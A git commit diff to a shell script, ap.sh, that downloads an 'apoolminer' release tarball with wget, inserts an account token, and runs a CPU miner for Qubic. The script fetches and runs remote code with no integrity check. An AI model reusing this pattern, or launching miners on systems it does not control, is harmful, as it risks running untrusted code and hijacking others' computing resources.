f30528e19638bf44164a982b65e4606317a7d006
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-09-24 16:00:35 +0800

    Update ap.sh

--- ap.sh
+++ ap.sh
@@ -9,8 +9,10 @@ version="${2:-}"
 
 tmp=`mktemp -d`;
 wget -qO- "https://github.com/apool-io/apoolminer/releases/download/${version}/apoolminer_linux_${version}.tar" |tar -zx -C "$tmp"
-sed -i "s/--account [0-9a-zA-Z_]*/--account ${token}/g" "${tmp}/run_qubic_cpu.sh"
 
 cd "${tmp}"
-./run_qubic_cpu.sh
+if [ -f "./run_qubic_cpu.sh" ]; then
+  sed -i "s/--account [0-9a-zA-Z_]*/--account ${token}/g" ./run_qubic_cpu.sh
+  ./run_qubic_cpu.sh
+fi
 
